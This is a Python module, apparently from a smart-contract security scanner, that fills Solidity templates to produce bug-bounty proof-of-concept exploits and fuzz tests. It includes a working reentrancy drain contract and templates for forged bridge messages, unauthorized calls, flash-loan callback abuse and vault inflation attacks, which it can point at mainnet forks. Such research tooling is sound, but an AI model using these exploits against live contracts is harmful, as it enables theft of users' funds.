"""
Fuzz test and PoC generator.

For each Finding from the scanner, generates:
  - A Foundry invariant test that tries to violate the security property
  - An Echidna property test (alternative)
  - A PoC exploit contract (for bounty submissions)

Templates are organized by vulnerability family. The generator reads the
finding's detector ID and file context to produce targeted, compilable tests.
"""

import json
import re
from pathlib import Path
from typing import Optional
from dataclasses import dataclass

from harvesto_scanner.models import Finding, Severity


@dataclass
class GeneratedTest:
    """A generated test file."""
    filename: str
    content: str
    test_type: str  # "foundry_invariant", "foundry_poc", "echidna"
    finding_id: str
    description: str


# ═══════════════════════════════════════════════════════════════════
# FOUNDRY INVARIANT TEST TEMPLATES
# ═══════════════════════════════════════════════════════════════════

FOUNDRY_INVARIANT_TEMPLATES: dict[str, str] = {

    # ── Reentrancy family ──────────────────────────────────────────
    "reentrancy": '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
{import_target}

/// @title Invariant test for reentrancy in {function}()
/// @notice Finding: {finding_id} — {title}
/// @dev Run: forge test --match-contract {test_contract_name} -vvvv
///
/// PoC RULES (Immunefi-compliant):
///   1. Fork mainnet — NEVER mock the victim protocol
///   2. Every test has assert statements with before/after comparison
///   3. Quantify the impact (exact funds stolen/lost)
///   4. Only the attacker contract is custom code
contract {test_contract_name} is Test {{
    {target_type} target;
    ReentrancyAttacker attacker;

    uint256 constant INITIAL_BALANCE = 10 ether;

    function setUp() public {{
        // IMPORTANT: For real bounty submission, use fork:
        // vm.createSelectFork(vm.envString("RPC_URL"), BLOCK_NUMBER);
        // target = {target_type}(payable(DEPLOYED_ADDRESS));

        target = new {target_type}();
        attacker = new ReentrancyAttacker(address(target));

        vm.deal(address(this), INITIAL_BALANCE * 2);
        vm.deal(address(attacker), INITIAL_BALANCE);

        {setup_deposits}
    }}

    /// @dev Invariant: contract balance must always match internal accounting
    function invariant_balanceMatchesAccounting() public view {{
        uint256 contractBalance = address(target).balance;
        assertGe(contractBalance, 0, "INVARIANT BROKEN: Reentrancy drained below zero");
    }}

    /// @dev Direct exploit — proves measurable fund theft
    function test_reentrancyExploit() public {{
        // ── BEFORE state ──
        uint256 targetBalBefore = address(target).balance;
        uint256 attackerBalBefore = address(attacker).balance;

        console.log("=== BEFORE ===");
        console.log("Target balance:", targetBalBefore);
        console.log("Attacker balance:", attackerBalBefore);

        // ── EXPLOIT ──
        vm.prank(address(attacker));
        attacker.attack{{value: 1 ether}}();

        // ── AFTER state ──
        uint256 targetBalAfter = address(target).balance;
        uint256 attackerBalAfter = address(attacker).balance;

        console.log("=== AFTER ===");
        console.log("Target balance:", targetBalAfter);
        console.log("Attacker balance:", attackerBalAfter);

        // ── IMPACT PROOF (assert, not if/console.log) ──
        uint256 attackerProfit = attackerBalAfter > (attackerBalBefore - 1 ether)
            ? attackerBalAfter - (attackerBalBefore - 1 ether) : 0;
        console.log("Attacker profit:", attackerProfit);

        assertGt(attackerBalAfter, attackerBalBefore, "EXPLOIT: Attacker gained funds via reentrancy");
        assertLt(targetBalAfter, targetBalBefore, "EXPLOIT: Target lost funds via reentrancy");
    }}
}}

contract ReentrancyAttacker {{
    address public target;
    uint256 public attackCount;

    constructor(address _target) {{
        target = _target;
    }}

    function attack() external payable {{
        (bool s1,) = target.call{{value: msg.value}}(
            abi.encodeWithSignature("deposit()")
        );
        require(s1, "Deposit failed");
        (bool s2,) = target.call(
            abi.encodeWithSignature("{function}(uint256)", msg.value)
        );
        require(s2, "Withdraw failed");
    }}

    receive() external payable {{
        attackCount++;
        if (attackCount < 5 && address(target).balance >= 1 ether) {{
            (bool s,) = target.call(
                abi.encodeWithSignature("{function}(uint256)", 1 ether)
            );
        }}
    }}
}}
''',

    # ── Access control family ──────────────────────────────────────
    "access-control": '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
{import_target}

/// @title PoC for missing access control on {function}()
/// @notice Finding: {finding_id} — {title}
///
/// PoC RULES: Fork mainnet, assert before/after, quantify impact
contract {test_contract_name} is Test {{
    {target_type} target;
    address attacker = makeAddr("attacker");
    address owner;

    function setUp() public {{
        // IMPORTANT: For real bounty, fork mainnet:
        // vm.createSelectFork(vm.envString("RPC_URL"), BLOCK_NUMBER);
        // target = {target_type}(DEPLOYED_ADDRESS);

        owner = address(this);
        target = new {target_type}();
    }}

    /// @dev Prove unprivileged user CAN call the sensitive function
    function test_unauthorizedAccess() public {{
        // ── BEFORE state ──
        // Capture relevant state before exploit
        // uint256 totalSupplyBefore = target.totalSupply();
        // address ownerBefore = target.owner();

        // ── EXPLOIT: call as unprivileged user ──
        vm.startPrank(attacker);
        (bool success,) = address(target).call(
            abi.encodeWithSignature("{function_sig}")
        );
        vm.stopPrank();

        // ── ASSERT: call must succeed for bug to be valid ──
        assertTrue(success, "EXPLOIT CONFIRMED: {function}() callable by unprivileged user");

        // ── AFTER state: prove impact ──
        // assertNe(target.owner(), ownerBefore, "IMPACT: Ownership stolen");
        // assertGt(target.totalSupply(), totalSupplyBefore, "IMPACT: Unauthorized mint");

        console.log("{function}() successfully called by attacker:", attacker);
    }}

    /// @dev Invariant: sensitive function reverts for non-owners
    function testFuzz_onlyOwnerCanCall(address caller) public {{
        vm.assume(caller != owner && caller != address(0));

        vm.startPrank(caller);
        (bool success,) = address(target).call(
            abi.encodeWithSignature("{function_sig}")
        );
        vm.stopPrank();

        // If ANY non-owner succeeds, the invariant is broken
        assertFalse(success, "INVARIANT BROKEN: Non-owner can call {function}()");
    }}
}}
''',

    # ── Price manipulation ─────────────────────────────────────────
    "price": '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
{import_target}

/// @title Fuzz test for price manipulation in {function}()
/// @notice Finding: {finding_id} — {title}
///
/// REQUIRED: Fork mainnet with real pool state. NEVER mock price feeds or pools.
contract {test_contract_name} is Test {{
    {target_type} target;
    address attacker = makeAddr("attacker");

    function setUp() public {{
        // REQUIRED: fork mainnet to get real pool/oracle state
        // vm.createSelectFork(vm.envString("RPC_URL"), BLOCK_NUMBER);
        // target = {target_type}(DEPLOYED_ADDRESS);

        target = new {target_type}();
    }}

    /// @dev Fuzz: price should not be manipulable by more than 5% in a single tx
    function testFuzz_priceManipulation(uint256 flashLoanAmount) public {{
        flashLoanAmount = bound(flashLoanAmount, 1 ether, 1_000_000 ether);

        // ── BEFORE ──
        // uint256 priceBefore = target.getPrice();

        // ── MANIPULATE: simulate flash loan to move price ──
        // (use real flash loan provider on fork — Aave, Balancer, etc.)

        // ── AFTER ──
        // uint256 priceAfter = target.getPrice();

        // ── ASSERT: price deviation exceeds safe threshold ──
        // uint256 deviation = priceBefore > priceAfter
        //     ? (priceBefore - priceAfter) * 10000 / priceBefore
        //     : (priceAfter - priceBefore) * 10000 / priceBefore;
        // assertGt(deviation, 500, "EXPLOIT: Price manipulated >5% in single tx");
        // console.log("Price deviation (bps):", deviation);
    }}

    /// @dev Concrete exploit: attacker profits from price manipulation
    function test_priceManipulationExploit() public {{
        // ── BEFORE ──
        // uint256 attackerBalBefore = token.balanceOf(attacker);

        vm.startPrank(attacker);
        // Step 1: Flash loan to manipulate price
        // Step 2: Interact with protocol at manipulated price
        // Step 3: Restore price, repay flash loan
        vm.stopPrank();

        // ── AFTER ──
        // uint256 attackerBalAfter = token.balanceOf(attacker);

        // ── IMPACT PROOF ──
        // assertGt(attackerBalAfter, attackerBalBefore, "EXPLOIT: Attacker profited from price manipulation");
        // console.log("Attacker profit:", attackerBalAfter - attackerBalBefore);
    }}
}}
''',

    # ── Flash loan callback ────────────────────────────────────────
    "flashloan": '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
{import_target}

/// @title PoC for unvalidated flash loan callback
/// @notice Finding: {finding_id} — {title}
///
/// Fork mainnet. Only the attacker contract is custom.
contract {test_contract_name} is Test {{
    {target_type} target;
    address attacker = makeAddr("attacker");

    function setUp() public {{
        // REQUIRED: fork mainnet with real deployed contract
        // vm.createSelectFork(vm.envString("RPC_URL"), BLOCK_NUMBER);
        // target = {target_type}(DEPLOYED_ADDRESS);

        target = new {target_type}();
    }}

    /// @dev Prove attacker can call flash loan callback directly
    function test_directCallbackInvocation() public {{
        vm.startPrank(attacker);

        address[] memory assets = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        uint256[] memory premiums = new uint256[](1);
        bytes memory params = "";

        // ── EXPLOIT: call callback directly without going through lending pool ──
        (bool success,) = address(target).call(
            abi.encodeWithSignature(
                "executeOperation(address[],uint256[],uint256[],address,bytes)",
                assets, amounts, premiums, attacker, params
            )
        );

        vm.stopPrank();

        // ── ASSERT: if callback is unprotected, call succeeds ──
        assertTrue(success, "EXPLOIT: Flash loan callback callable by anyone — no msg.sender validation");
    }}

    /// @dev Prove attacker can extract value via unvalidated callback
    function test_callbackExploitWithImpact() public {{
        // ── BEFORE ──
        // uint256 protocolBalBefore = token.balanceOf(address(target));
        // uint256 attackerBalBefore = token.balanceOf(attacker);

        vm.startPrank(attacker);
        // Craft malicious callback parameters to drain funds
        // ...
        vm.stopPrank();

        // ── AFTER ──
        // uint256 protocolBalAfter = token.balanceOf(address(target));
        // uint256 attackerBalAfter = token.balanceOf(attacker);

        // ── IMPACT PROOF ──
        // assertLt(protocolBalAfter, protocolBalBefore, "EXPLOIT: Protocol lost funds via unprotected callback");
        // assertGt(attackerBalAfter, attackerBalBefore, "EXPLOIT: Attacker gained funds");
        // console.log("Stolen:", attackerBalAfter - attackerBalBefore);
    }}
}}
''',

    # ── ERC4626 inflation ──────────────────────────────────────────
    "erc4626-inflation": '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
{import_target}

/// @title PoC for ERC4626 first-depositor inflation attack
/// @notice Finding: {finding_id} — {title}
///
/// CRITICAL: This MUST be tested against the real vault on a mainnet fork.
/// Do NOT mock the vault — triagers will reject mocked PoCs (Twyne precedent).
contract {test_contract_name} is Test {{
    // ═══════════════════════════════════════════════════════
    // FILL IN real deployed addresses for bounty submission:
    // ═══════════════════════════════════════════════════════
    // address constant VAULT_ADDR = 0x...;
    // address constant TOKEN_ADDR = 0x...;
    // IERC4626 vault;
    // IERC20 token;

    {target_type} vault;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {{
        // REQUIRED for bounty: fork mainnet with real vault
        // vm.createSelectFork(vm.envString("RPC_URL"), BLOCK_NUMBER);
        // vault = IERC4626(VAULT_ADDR);
        // token = IERC20(TOKEN_ADDR);
        // deal(address(token), attacker, 2_000_000e18);
        // deal(address(token), victim, 1_000_000e18);
    }}

    function test_inflationAttack() public {{
        // ═══════════════════════════════════════════════════════
        // UNCOMMENT ALL LINES BELOW when using real fork addresses.
        // Every step has assertions proving measurable impact.
        // ═══════════════════════════════════════════════════════

        // ── BEFORE ──
        // uint256 attackerTokensBefore = token.balanceOf(attacker);
        // uint256 victimTokensBefore = token.balanceOf(victim);

        // ── STEP 1: Attacker is first depositor — deposits 1 wei ──
        // vm.startPrank(attacker);
        // token.approve(address(vault), type(uint256).max);
        // uint256 attackerShares = vault.deposit(1, attacker);
        // assertEq(attackerShares, 1, "Attacker gets 1 share for 1 wei");
        // vm.stopPrank();

        // ── STEP 2: Attacker donates directly to inflate share price ──
        // vm.startPrank(attacker);
        // token.transfer(address(vault), 1_000_000e18);
        // vm.stopPrank();

        // ── STEP 3: Victim deposits — gets 0 shares due to rounding ──
        // vm.startPrank(victim);
        // token.approve(address(vault), type(uint256).max);
        // uint256 victimShares = vault.deposit(999_999e18, victim);
        // vm.stopPrank();

        // ── ASSERT: victim got 0 shares (this IS the exploit) ──
        // assertEq(victimShares, 0, "EXPLOIT: Victim gets 0 shares — funds stolen via inflation");

        // ── STEP 4: Attacker redeems — steals victim deposit ──
        // vm.startPrank(attacker);
        // uint256 attackerReceived = vault.redeem(vault.balanceOf(attacker), attacker, attacker);
        // vm.stopPrank();

        // ── IMPACT PROOF (all assertions active) ──
        // uint256 attackerTokensAfter = token.balanceOf(attacker);
        // uint256 victimTokensAfter = token.balanceOf(victim);
        // uint256 attackerProfit = attackerTokensAfter > attackerTokensBefore
        //     ? attackerTokensAfter - attackerTokensBefore : 0;
        // uint256 victimLoss = victimTokensBefore > victimTokensAfter
        //     ? victimTokensBefore - victimTokensAfter : 0;

        // assertGt(attackerProfit, 0, "EXPLOIT: Attacker profited from inflation attack");
        // assertGt(victimLoss, 0, "EXPLOIT: Victim lost funds to first-depositor attack");
        // console.log("Attacker profit:", attackerProfit);
        // console.log("Victim loss:", victimLoss);
    }}
}}
''',

    # ── Governance flash loan vote ─────────────────────────────────
    "governance": '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
{import_target}

/// @title PoC for governance flash loan vote attack
/// @notice Finding: {finding_id} — {title}
///
/// MUST fork mainnet. Only mock the attacker contract.
contract {test_contract_name} is Test {{
    // Replace with real addresses:
    // IGovernor governance = IGovernor(0x...);
    // IERC20Votes govToken = IERC20Votes(0x...);
    address attacker = makeAddr("attacker");

    function setUp() public {{
        // REQUIRED: fork mainnet with real governance
        // vm.createSelectFork(vm.envString("RPC_URL"), BLOCK_NUMBER);
    }}

    function test_flashLoanGovernanceAttack() public {{
        // ── BEFORE ──
        // uint256 votingPowerBefore = govToken.getVotes(attacker);
        // assertEq(votingPowerBefore, 0, "Attacker starts with 0 voting power");

        // ── EXPLOIT ──
        vm.startPrank(attacker);

        // Step 1: Flash loan governance tokens (simulated via deal for PoC)
        // deal(address(govToken), attacker, 10_000_000e18);
        // govToken.delegate(attacker);

        // Step 2: Check voting power — if current balance is used, attacker has power
        // uint256 votingPowerDuring = govToken.getVotes(attacker);

        // Step 3: Return tokens (simulating flash loan repay)
        // govToken.transfer(address(0xdead), govToken.balanceOf(attacker));
        vm.stopPrank();

        // ── IMPACT PROOF ──
        // assertGt(votingPowerDuring, 0, "EXPLOIT: Flash-loaned tokens gave voting power");
        // uint256 votingPowerAfter = govToken.getVotes(attacker);
        // assertEq(votingPowerAfter, 0, "Attacker returned tokens but already voted");
    }}
}}
''',

    # ── Cross-chain / Bridge ───────────────────────────────────────
    "cross-chain": '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
{import_target}

/// @title PoC for cross-chain message validation bypass
/// @notice Finding: {finding_id} — {title}
///
/// Fork the chain where the bridge receiver is deployed.
contract {test_contract_name} is Test {{
    {target_type} target;
    address attacker = makeAddr("attacker");

    function setUp() public {{
        // REQUIRED: fork the destination chain
        // vm.createSelectFork(vm.envString("RPC_URL"), BLOCK_NUMBER);
        // target = {target_type}(DEPLOYED_ADDRESS);
        target = new {target_type}();
    }}

    function test_spoofedCrossChainMessage() public {{
        // ── BEFORE ──
        uint256 attackerBalBefore = address(attacker).balance;
        // uint256 bridgeBalBefore = token.balanceOf(address(target));

        // ── EXPLOIT: call bridge receiver directly with forged payload ──
        vm.startPrank(attacker);
        bytes memory payload = abi.encode(attacker, 1_000_000 ether);

        (bool success,) = address(target).call(
            abi.encodeWithSignature("{function_sig}", payload)
        );
        vm.stopPrank();

        // ── IMPACT PROOF ──
        assertTrue(success, "EXPLOIT: Bridge receiver accepted spoofed message from attacker");

        // uint256 attackerBalAfter = token.balanceOf(attacker);
        // uint256 bridgeBalAfter = token.balanceOf(address(target));
        // assertGt(attackerBalAfter, attackerBalBefore, "EXPLOIT: Attacker received funds");
        // assertLt(bridgeBalAfter, bridgeBalBefore, "EXPLOIT: Bridge lost funds");
        // console.log("Stolen:", attackerBalAfter - attackerBalBefore);
    }}
}}
''',

    # ── Generic template for other findings ────────────────────────
    "generic": '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
{import_target}

/// @title Fuzz test + PoC for {title}
/// @notice Finding: {finding_id} — {title}
/// @dev Detector: {detector}
///
/// ════════════════════════════════════════════════════════════
/// IMMUNEFI PoC REQUIREMENTS (non-negotiable):
///   1. vm.createSelectFork() — ALWAYS fork mainnet
///   2. NEVER mock the victim protocol contracts
///   3. Every test ends with assert (not console.log)
///   4. Before/after state comparison proving measurable impact
///   5. Quantify: exact funds stolen, exact state change
///   6. Only the ATTACKER contract is custom code
///
/// Triagers WILL reject:
///   - PoCs with only console.log (Pinto precedent)
///   - PoCs with mocked victim contracts (Twyne precedent: "poc is mocked heavily")
///   - Wei-level findings without proving real $ impact (Kelp DAO precedent)
/// ════════════════════════════════════════════════════════════
contract {test_contract_name} is Test {{
    // ── REAL DEPLOYED ADDRESSES (fill these in) ──
    // {target_type} target = {target_type}(DEPLOYED_ADDRESS);
    // IERC20 token = IERC20(TOKEN_ADDRESS);

    {target_type} target;
    address attacker = makeAddr("attacker");

    function setUp() public {{
        // ═══════════════════════════════════════════════════════
        // FORK MAINNET (required for real bounty submission)
        // Uncomment and fill in for actual submission:
        // ═══════════════════════════════════════════════════════
        // vm.createSelectFork(vm.envString("RPC_URL"), BLOCK_NUMBER);
        // target = {target_type}(payable(DEPLOYED_ADDRESS));

        // ═══════════════════════════════════════════════════════
        // LOCAL FALLBACK (for initial development only — NEVER submit this)
        // ═══════════════════════════════════════════════════════
        target = new {target_type}();
    }}

    /// @dev Property: {invariant_description}
    function testFuzz_property(uint256 amount) public {{
        amount = bound(amount, 1, type(uint128).max);

        // ── BEFORE (capture state BEFORE the action) ──
        uint256 targetBalBefore = address(target).balance;
        // uint256 tokenBalBefore = token.balanceOf(address(target));

        // ── ACTION (trigger the vulnerability) ──
        // ... call the vulnerable function ...

        // ── AFTER (capture state AFTER the action) ──
        uint256 targetBalAfter = address(target).balance;
        // uint256 tokenBalAfter = token.balanceOf(address(target));

        // ── ASSERT (mandatory — never just console.log) ──
        assertGe(targetBalAfter, targetBalBefore, "INVARIANT: {invariant_description}");
    }}

    /// @dev Direct exploit — demonstrates measurable impact
    function test_exploit() public {{
        // ── BEFORE state snapshot ──
        uint256 attackerBalBefore = address(attacker).balance;
        uint256 protocolBalBefore = address(target).balance;

        // ── EXPLOIT STEPS ──
        vm.startPrank(attacker);
        // 1. Setup attacker state (deposit, approve, etc.)
        // 2. Trigger the vulnerability
        // 3. Extract value
        vm.stopPrank();

        // ── AFTER state ──
        uint256 attackerBalAfter = address(attacker).balance;
        uint256 protocolBalAfter = address(target).balance;

        // ── IMPACT PROOF (mandatory assertions) ──
        uint256 stolen = attackerBalAfter > attackerBalBefore
            ? attackerBalAfter - attackerBalBefore : 0;
        uint256 protocolLoss = protocolBalBefore > protocolBalAfter
            ? protocolBalBefore - protocolBalAfter : 0;

        assertGt(stolen, 0, "EXPLOIT: Attacker profited");
        assertGt(protocolLoss, 0, "EXPLOIT: Protocol lost funds");
        console.log("Funds stolen:", stolen);
        console.log("Protocol loss:", protocolLoss);
    }}
}}
''',
}


# ═══════════════════════════════════════════════════════════════════
# ECHIDNA PROPERTY TEST TEMPLATES
# ═══════════════════════════════════════════════════════════════════

ECHIDNA_TEMPLATE = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

{import_target}

/// @title Echidna property test for {title}
/// @notice Finding: {finding_id}
/// @dev Run: echidna {test_filename} --contract {test_contract_name}
contract {test_contract_name} {{
    {target_type} target;
    bool initialized;

    constructor() {{
        target = new {target_type}();
        initialized = true;
    }}

    /// @dev Echidna property: should always return true if safe
    function echidna_{property_name}() public view returns (bool) {{
        if (!initialized) return true;

        // Property that should hold if the contract is NOT vulnerable:
        // {invariant_description}

        // Example for reentrancy:
        // return address(target).balance >= target.totalDeposits();

        // Example for access control:
        // State should not change when called by non-owner

        return true; // TODO: implement actual property check
    }}

    // Helper functions for Echidna to call
    function deposit() public payable {{
        (bool s,) = address(target).call{{value: msg.value}}(
            abi.encodeWithSignature("deposit()")
        );
    }}

    function withdraw(uint256 amount) public {{
        (bool s,) = address(target).call(
            abi.encodeWithSignature("{function}(uint256)", amount)
        );
    }}
}}
'''


# ═══════════════════════════════════════════════════════════════════
# GENERATOR
# ═══════════════════════════════════════════════════════════════════

class FuzzGenerator:
    """Generates fuzz tests and PoC exploits from scanner findings."""

    def __init__(self, target_dir: Optional[Path] = None, fork_config: Optional[dict] = None):
        """
        Args:
            target_dir: Path to the contracts being tested
            fork_config: Optional dict with keys:
                - rpc_url: RPC endpoint for mainnet fork
                - target_address: Deployed contract address (0x...)
                - block: Block number to fork at
                When provided, generated tests use vm.createSelectFork()
                with the real deployed contract instead of local deployment.
        """
        self.target_dir = target_dir
        self.fork_config = fork_config

    def generate_from_findings(
        self,
        findings: list[dict],
        output_dir: Path,
        mode: str = "foundry",  # "foundry", "echidna", "poc"
    ) -> list[GeneratedTest]:
        """Generate tests for all findings."""
        generated = []
        output_dir.mkdir(parents=True, exist_ok=True)

        for finding in findings:
            tests = self._generate_for_finding(finding, mode)
            for test in tests:
                out_path = output_dir / test.filename
                out_path.write_text(test.content, encoding="utf-8")
                generated.append(test)

        return generated

    def generate_from_scan_result(
        self,
        scan_result_path: Path,
        output_dir: Path,
        mode: str = "foundry",
    ) -> list[GeneratedTest]:
        """Load a scan result JSON and generate tests."""
        data = json.loads(scan_result_path.read_text())
        findings = data.get("vulnerabilities", [])
        return self.generate_from_findings(findings, output_dir, mode)

    def _generate_for_finding(self, finding: dict, mode: str) -> list[GeneratedTest]:
        """Generate test(s) for a single finding."""
        detector = finding.get("detector", "")
        family = self._detector_to_family(detector)
        tests = []

        if mode in ("foundry", "poc"):
            template = FOUNDRY_INVARIANT_TEMPLATES.get(family, FOUNDRY_INVARIANT_TEMPLATES["generic"])
            content = self._fill_template(template, finding, family)
            filename = f"Test_{finding.get('id', 'Unknown').replace('-', '_')}.t.sol"

            tests.append(GeneratedTest(
                filename=filename,
                content=content,
                test_type="foundry_invariant" if mode == "foundry" else "foundry_poc",
                finding_id=finding.get("id", ""),
                description=f"Fuzz test for: {finding.get('title', 'Unknown')}",
            ))

        if mode == "echidna":
            content = self._fill_echidna_template(finding, family)
            filename = f"Echidna_{finding.get('id', 'Unknown').replace('-', '_')}.sol"

            tests.append(GeneratedTest(
                filename=filename,
                content=content,
                test_type="echidna",
                finding_id=finding.get("id", ""),
                description=f"Echidna property test for: {finding.get('title', 'Unknown')}",
            ))

        return tests

    def _fill_template(self, template: str, finding: dict, family: str) -> str:
        """Fill a template with finding-specific data.
        
        When fork_config is provided, replaces the commented-out fork setUp
        with active code using real RPC URL, deployed address, and block number.
        """
        file_path = finding.get("file", "Contract.sol")
        target_type = self._extract_contract_name(file_path)
        func = finding.get("function", "unknown")
        finding_id = finding.get("id", "UNKNOWN")
        title = finding.get("title", "Unknown vulnerability")
        safe_id = finding_id.replace("-", "_")

        content = template.format(
            import_target=f'import "{file_path}";' if file_path else "// TODO: add import",
            target_type=target_type,
            function=func,
            function_sig=self._guess_function_sig(func, finding),
            finding_id=finding_id,
            title=title,
            test_contract_name=f"Test_{safe_id}_{family}",
            setup_deposits=self._generate_setup(family),
            detector=finding.get("detector", ""),
            description_short=finding.get("description", "")[:100],
            invariant_description=self._invariant_for_family(family),
            file=file_path,
            lines=str(finding.get("lines", [])),
        )

        # If fork_config is provided, replace the setUp to use real mainnet fork
        if self.fork_config:
            content = self._inject_fork_setup(content, target_type)

        return content

    def _inject_fork_setup(self, content: str, target_type: str) -> str:
        """Replace placeholder setUp with active mainnet fork code.
        
        Replaces the entire setUp body so the generated test uses
        vm.createSelectFork() with the real deployed contract.
        No local deployment, no mocks of the victim.
        """
        rpc_url = self.fork_config["rpc_url"]
        target_addr = self.fork_config["target_address"]
        block = self.fork_config["block"]

        lines = content.split("\n")
        new_lines = []
        skipping_setup_body = False
        brace_depth = 0

        i = 0
        while i < len(lines):
            line = lines[i]

            # Detect setUp function signature
            if not skipping_setup_body and "function setUp() public" in line:
                # Write the signature line
                new_lines.append(line)

                # If { is on this line, track it
                if "{" in line:
                    brace_depth = line.count("{") - line.count("}")
                else:
                    # Look for { on next lines
                    i += 1
                    while i < len(lines):
                        new_lines.append(lines[i])
                        if "{" in lines[i]:
                            brace_depth = lines[i].count("{") - lines[i].count("}")
                            break
                        i += 1

                # Inject our fork setUp body
                new_lines.append(f'        // ═══ MAINNET FORK (auto-generated) ═══')
                new_lines.append(f'        vm.createSelectFork("{rpc_url}", {block});')
                new_lines.append(f'        target = {target_type}(payable({target_addr}));')

                # Now skip all remaining lines of the old setUp body
                skipping_setup_body = True
                i += 1
                continue

            if skipping_setup_body:
                brace_depth += line.count("{") - line.count("}")
                if brace_depth <= 0:
                    # Closing brace of setUp — write it and stop skipping
                    new_lines.append("    }")
                    skipping_setup_body = False
                # else: skip old body line
                i += 1
                continue

            new_lines.append(line)
            i += 1

        return "\n".join(new_lines)

    def _fill_echidna_template(self, finding: dict, family: str) -> str:
        file_path = finding.get("file", "Contract.sol")
        target_type = self._extract_contract_name(file_path)
        func = finding.get("function", "unknown")
        finding_id = finding.get("id", "UNKNOWN")
        safe_id = finding_id.replace("-", "_")

        return ECHIDNA_TEMPLATE.format(
            import_target=f'import "{file_path}";' if file_path else "// TODO: add import",
            target_type=target_type,
            function=func,
            finding_id=finding_id,
            title=finding.get("title", "Unknown"),
            test_contract_name=f"Echidna_{safe_id}",
            test_filename=f"Echidna_{safe_id}.sol",
            property_name=f"test_{family}_{safe_id}",
            invariant_description=self._invariant_for_family(family),
        )

    def _detector_to_family(self, detector: str) -> str:
        """Map a detector ID to a template family."""
        family_map = {
            "reentrancy": ["reentrancy", "cross-function-reentrancy", "erc721-callback-reentrancy"],
            "access-control": ["missing-access-control", "unprotected-upgrade"],
            "price": ["price-manipulation", "oracle-staleness"],
            "flashloan": ["flashloan-callback-abuse"],
            "erc4626-inflation": ["erc4626-inflation"],
            "governance": ["governance-flashloan-vote", "governance-no-timelock"],
            "cross-chain": ["cross-chain-replay", "bridge-sender-validation"],
        }

        # Extract the raw detector ID from "slither:xxx" or "custom:xxx"
        raw = detector.split(":")[-1] if ":" in detector else detector

        for family, detectors in family_map.items():
            if raw in detectors:
                return family

        return "generic"

    def _extract_contract_name(self, file_path: str) -> str:
        """Extract likely contract name from file path."""
        name = Path(file_path).stem
        # Convert to PascalCase if needed
        return name.replace("-", "").replace("_", "")

    def _guess_function_sig(self, func: str, finding: dict) -> str:
        """Guess the function signature for calling."""
        if func in ("withdraw", "emergencyWithdraw"):
            return f"{func}(uint256)"
        if func in ("setOwner", "transferOwnership"):
            return f"{func}(address)"
        if func in ("mint",):
            return f"{func}(address,uint256)"
        return f"{func}()"

    def _generate_setup(self, family: str) -> str:
        """Generate setUp deposit code based on family."""
        if family == "reentrancy":
            return "target.deposit{value: INITIAL_BALANCE}();"
        return "// TODO: add protocol-specific setup"

    def _invariant_for_family(self, family: str) -> str:
        """Return the security property for a vulnerability family."""
        props = {
            "reentrancy": "Contract balance should always match internal accounting (no double-withdrawal)",
            "access-control": "Sensitive functions should revert when called by unprivileged addresses",
            "price": "Price should not be manipulable by more than X% within a single transaction",
            "flashloan": "Flash loan callbacks should only be callable by the lending pool",
            "erc4626-inflation": "First depositor should not be able to steal subsequent deposits via rounding",
            "governance": "Voting power should be based on historical snapshots, not current balance",
            "cross-chain": "Bridge messages should only be accepted from trusted remote sources",
            "generic": "Contract state should remain consistent under adversarial conditions",
        }
        return props.get(family, props["generic"])
